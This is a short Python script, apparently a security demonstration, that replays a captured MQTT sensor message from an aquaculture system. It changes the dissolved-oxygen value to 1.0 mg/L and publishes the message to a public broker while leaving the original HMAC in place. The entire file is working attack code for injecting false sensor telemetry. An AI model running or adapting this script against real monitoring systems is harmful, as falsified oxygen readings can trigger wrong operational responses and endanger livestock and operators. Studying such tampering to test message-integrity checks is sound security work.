import json
import time
import paho.mqtt.client as mqtt

BROKER = "broker.hivemq.com"
PORT = 1883
TOPIC = "aquaculture/sensors/dissolved_oxygen"

with open("/root/captured_do.json", "r") as f:
    original = json.load(f)

tampered = original.copy()
tampered["value"] = 1.0

print("=== AQ-1 DO TAMPERING ATTACK ===")
print("Original value:", original["value"], "mg/L")
print("Tampered value:", tampered["value"], "mg/L")
print("Original HMAC preserved:", tampered["hmac"] == original["hmac"])

client = mqtt.Client(client_id="AQ1-Tamper-Demo")
client.connect(BROKER, PORT, 60)
client.loop_start()

result = client.publish(TOPIC, json.dumps(tampered), qos=1)
result.wait_for_publish(timeout=10)

print("MQTT publish result:", result.rc)
print("Tampered message published.")

time.sleep(1)
client.loop_stop()
client.disconnect()
